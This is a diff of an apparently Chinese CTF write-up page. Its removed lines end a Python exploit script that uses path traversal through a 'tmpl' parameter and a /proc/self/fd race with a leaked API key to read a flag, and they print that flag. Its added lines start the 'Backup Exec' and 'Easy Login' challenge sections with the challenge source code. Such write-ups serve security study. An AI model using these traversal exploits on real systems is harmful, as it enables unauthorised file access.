-</span></span><span class="line"><span class="cl">                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET_URL</span><span class="si">}</span><span class="s2">/admin&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;tmpl&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;../../../../proc/self/fd/</span><span class="si">{</span><span class="n">fd</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">},</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s2">&#34;[&#39;app.py&#39;&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                    <span class="c1"># Look for the random flag filename</span>
-</span></span><span class="line"><span class="cl">                    <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;flag-[a-f0-9]</span><span class="si">{32}</span><span class="s2">\.txt&#34;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="k">match</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                        <span class="n">flag_file</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Found flag file: </span><span class="si">{</span><span class="n">flag_file</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                        <span class="n">stop_event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="n">flag_file</span>
-</span></span><span class="line"><span class="cl">            <span class="k">except</span><span class="p">:</span> <span class="k">pass</span>
-</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="n">stop_event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_flag</span><span class="p">(</span><span class="n">api_key</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Stage 3: Reading </span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s2">...&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Authorization&#34;</span><span class="p">:</span> <span class="n">api_key</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="c1"># Simple LFI to read the flag</span>
-</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET_URL</span><span class="si">}</span><span class="s2">/admin&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;tmpl&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;../../../../</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">})</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[!!!] FLAG: </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
-</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[-] Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">leak_api_key</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">key</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">flag_file</span> <span class="o">=</span> <span class="n">find_flag_filename</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">flag_file</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="n">read_flag</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">flag_file</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Failed to find flag filename. The race might be tough.&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Failed to leak API_KEY.&#34;</span><span class="p">)</span>
-</span></span></code></pre></div><p>flag</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">alictf{301e7a69-1262-4955-abe7-c8a120bd2093}
-</span></span></code></pre></div><h2 id="backup-exec">Backup Exec</h2>
+<h2 id="backup-exec">Backup Exec</h2>
 <p>Re + Web</p>
 <p>题目说明了攻击路径+flag路径，任务就是复盘+读取 <code>C:\Users\Administrator\Desktop\flag.txt</code></p>
 <p>非常善良的题目 甚至给了pdb 直接狠狠拖入IDA</p>
@@ -1361,6 +1128,767 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="easy-login">Easy Login</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">$</span> <span class="o">=</span> <span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">terminalBody</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;terminalBody&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">currentUser</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;currentUser&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">appendLine</span><span class="p">(</span><span class="nx">className</span><span class="p">,</span> <span class="nx">text</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">line</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">line</span><span class="p">.</span><span class="nx">className</span> <span class="o">=</span> <span class="sb">`line </span><span class="si">${</span><span class="nx">className</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">line</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">text</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">terminalBody</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">line</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">terminalBody</span><span class="p">.</span><span class="nx">scrollTop</span> <span class="o">=</span> <span class="nx">terminalBody</span><span class="p">.</span><span class="nx">scrollHeight</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">logRequest</span><span class="p">(</span><span class="nx">method</span><span class="p">,</span> <span class="nx">path</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nx">body</span> <span class="o">?</span> <span class="sb">` </span><span class="si">${</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span><span class="si">}</span><span class="sb">`</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">appendLine</span><span class="p">(</span><span class="s1">&#39;request-line&#39;</span><span class="p">,</span> <span class="sb">`$ fetch </span><span class="si">${</span><span class="nx">method</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">()</span><span class="si">}</span><span class="sb"> </span><span class="si">${</span><span class="nx">path</span><span class="si">}${</span><span class="nx">payload</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">logResponse</span><span class="p">(</span><span class="nx">status</span><span class="p">,</span> <span class="nx">json</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">appendLine</span><span class="p">(</span><span class="s1">&#39;meta-line&#39;</span><span class="p">,</span> <span class="sb">`&lt; status </span><span class="si">${</span><span class="nx">status</span><span class="si">}</span><span class="sb"> &gt;`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">appendLine</span><span class="p">(</span><span class="s1">&#39;response-line&#39;</span><span class="p">,</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">json</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">logError</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">appendLine</span><span class="p">(</span><span class="s1">&#39;error-line&#39;</span><span class="p">,</span> <span class="sb">`! error: </span><span class="si">${</span><span class="nx">err</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">updateUserLabel</span><span class="p">(</span><span class="nx">username</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">username</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">currentUser</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="s1">&#39;guest&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">currentUser</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s1">&#39;pill-muted&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">currentUser</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">username</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">currentUser</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="s1">&#39;pill-muted&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">callApi</span><span class="p">(</span><span class="nx">method</span><span class="p">,</span> <span class="nx">path</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">logRequest</span><span class="p">(</span><span class="nx">method</span><span class="p">,</span> <span class="nx">path</span><span class="p">,</span> <span class="nx">body</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">method</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/json&#39;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">},</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">body</span><span class="o">:</span> <span class="nx">body</span> <span class="o">?</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span> <span class="o">:</span> <span class="kc">undefined</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">credentials</span><span class="o">:</span> <span class="s1">&#39;same-origin&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">text</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">res</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">json</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">json</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">text</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">json</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">raw</span><span class="o">:</span> <span class="nx">text</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">logResponse</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">,</span> <span class="nx">json</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">json</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">logError</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">throw</span> <span class="nx">err</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;DOMContentLoaded&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;loginForm&#39;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">.</span><span class="nx">trim</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">username</span> <span class="o">||</span> <span class="o">!</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">logError</span><span class="p">(</span><span class="s1">&#39;username and password required&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="p">{</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">json</span> <span class="p">}</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">callApi</span><span class="p">(</span><span class="s1">&#39;post&#39;</span><span class="p">,</span> <span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">password</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">ok</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">updateUserLabel</span><span class="p">(</span><span class="nx">json</span><span class="p">.</span><span class="nx">username</span> <span class="o">||</span> <span class="nx">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;btnLogout&#39;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kr">await</span> <span class="nx">callApi</span><span class="p">(</span><span class="s1">&#39;post&#39;</span><span class="p">,</span> <span class="s1">&#39;/logout&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">updateUserLabel</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;btnMe&#39;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="p">{</span> <span class="nx">json</span> <span class="p">}</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">callApi</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">,</span> <span class="s1">&#39;/me&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">json</span> <span class="o">&amp;&amp;</span> <span class="nx">json</span><span class="p">.</span><span class="nx">loggedIn</span> <span class="o">&amp;&amp;</span> <span class="nx">json</span><span class="p">.</span><span class="nx">username</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">updateUserLabel</span><span class="p">(</span><span class="nx">json</span><span class="p">.</span><span class="nx">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">updateUserLabel</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;btnAdmin&#39;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kr">await</span> <span class="nx">callApi</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">,</span> <span class="s1">&#39;/admin&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;btnVisit&#39;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">urlInput</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;visitUrl&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">urlInput</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">trim</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">logError</span><span class="p">(</span><span class="s1">&#39;url is required for /visit&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kr">await</span> <span class="nx">callApi</span><span class="p">(</span><span class="s1">&#39;post&#39;</span><span class="p">,</span> <span class="s1">&#39;/visit&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">url</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>没什么问题</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-typescript" data-lang="typescript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">dotenv</span> <span class="kr">from</span> <span class="s1">&#39;dotenv&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">express</span><span class="p">,</span> <span class="p">{</span> <span class="nx">Request</span><span class="p">,</span> <span class="nx">Response</span><span class="p">,</span> <span class="nx">NextFunction</span> <span class="p">}</span> <span class="kr">from</span> <span class="s1">&#39;express&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">cookieParser</span> <span class="kr">from</span> <span class="s1">&#39;cookie-parser&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">MongoClient</span><span class="p">,</span> <span class="nx">Db</span><span class="p">,</span> <span class="nx">Collection</span> <span class="p">}</span> <span class="kr">from</span> <span class="s1">&#39;mongodb&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">crypto</span> <span class="kr">from</span> <span class="s1">&#39;crypto&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">path</span> <span class="kr">from</span> <span class="s1">&#39;path&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">puppeteer</span> <span class="kr">from</span> <span class="s1">&#39;puppeteer&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">dotenv</span><span class="p">.</span><span class="nx">config</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">PORT</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span><span class="p">)</span> <span class="o">||</span> <span class="mi">3000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
